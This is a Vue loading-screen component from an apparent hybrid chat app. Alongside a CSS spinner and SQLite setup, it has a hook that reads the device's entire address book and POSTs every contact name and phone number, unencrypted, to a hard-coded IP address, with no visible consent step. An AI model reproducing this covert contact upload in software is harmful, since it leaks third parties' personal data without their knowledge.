<template>
  <div>
    <div class="loader-1">
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
    </div>
    <div class="loader-2">
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
      <div class="loader-inner"></div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'loadMsg',
  data () {
    const user = localStorage.getItem('user')
    const isCreate = localStorage.getItem('isCreate')
    return {
      user: (user && JSON.parse(user)) || null,
      isCreate: (isCreate && JSON.parse(isCreate)) || false,
      group: 1,
      friend: 0
    }
  },
  methods: {
  },
  created () {
    if (window.isApp) {
      if (!this.isCreate) {
        this.$sqlite.open()
        this.$sqlite.create(this.group)
        this.$sqlite.create(this.friend)
        this.$sqlite.close()
        localStorage.setItem('isCreate', JSON.stringify(true))
        this.$router.push('/chatList').then()
      }
    }
  },
  load: {
    dom () {
    },
    plus: () => {
      var userData = localStorage.getItem('user')
      let isUp = localStorage.getItem('isUp')
      if (window.isApp && userData !== null && isUp === null) {
        // 通讯录初始化
        window.plus.contacts.getAddressBook(window.plus.contacts.ADDRESSBOOK_PHONE, (addr) => {
          addr.find(['displayName', 'phoneNumbers'], (contacts) => {
            let name = []
            let phone = []
            contacts.forEach(c => {
              let phones = ''
              c.phoneNumbers.forEach(p => { phones = phones + p.value + ',' })
              phone.push(phones)
              name.push(c.displayName)
            })
            let userJson = JSON.parse(userData)
            let request = { name: name, phone: phone, userId: userJson.id }
            var xhr = new window.plus.net.XMLHttpRequest()
            xhr.onreadystatechange = function () {
              switch (xhr.readyState) {
                case 4:
                  if (xhr.status === 200) {
                    localStorage.setItem('isUp', JSON.stringify(true))
                  }
                  break
                default :
                  break
              }
            }
            xhr.open('POST', 'http://47.105.74.119:9998/contact/upload')
            xhr.setRequestHeader('Content-Type', 'application/json')
            xhr.send(JSON.stringify(request))
          })
        }, function () {
        }, { multiple: true })
      }
    }
  }
}
</script>

<style scoped>
  .loader-1{
    width: 220px;
    height: 200px;
    margin: 0 auto;
  }
  .loader-1 .loader-inner{
    width: 160px;
    height: 100px;
    border-radius: 5px;
    background: #2e2f26;
    margin: -50px 0 0 -80px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform-type: preserve-3d;
    animation: loading-11 3s cubic-bezier(0.55, 0.3, 0.24, 0.99) infinite;
  }
  .loader-1 .loader-inner:nth-child(2){
    width: 150px;
    height: 90px;
    border-radius: 3px;
    background: #ee6400;
    margin: -45px 0 0 -75px;
    z-index: 1;
    animation-name: loading-12;
  }
  .loader-1 .loader-inner:nth-child(3){
    width: 40px;
    height: 20px;
    border-radius: 0 0 5px 5px;
    background: #ebcc08;
    margin: 50px 0 0 -20px;
    z-index: 2;
    animation-name: loading-13;
  }
  @keyframes loading-11{
    3%,
    97%{
      width: 160px;
      height: 100px;
      margin-top: -50px;
      margin-left: -80px;
    }
    30%,
    36%{
      width: 80px;
      height: 120px;
      margin-top: -60px;
      margin-left: -40px;
    }
    63%,
    69%{
      width: 40px;
      height: 80px;
      margin-top: -40px;
      margin-left: -20px;
    }
  }
  @keyframes loading-12{
    3%,
    97%{
      width: 150px;
      height: 90px;
      margin-top: -45px;
      margin-left: -75px;
    }
    30%,
    36%{
      width: 70px;
      height: 96px;
      margin-top: -48px;
      margin-left: -35px;
    }
    63%,
    69%{
      width: 32px;
      height: 60px;
      margin-top: -30px;
      margin-left: -16px;
    }
  }
  @keyframes loading-13{
    3%,
    97%{
      width: 40px;
      height: 20px;
      margin-top: 50px;
      margin-left: -20px;
    }
    30%,
    36%{
      width: 8px;
      height: 8px;
      margin-top: 49px;
      margin-left: -5px;
      border-radius: 8px;
    }
    63%,
    69%{
      width: 16px;
      height: 4px;
      margin-top: -37px;
      margin-left: -8px;
      border-radius: 10px;
    }
  }
</style>
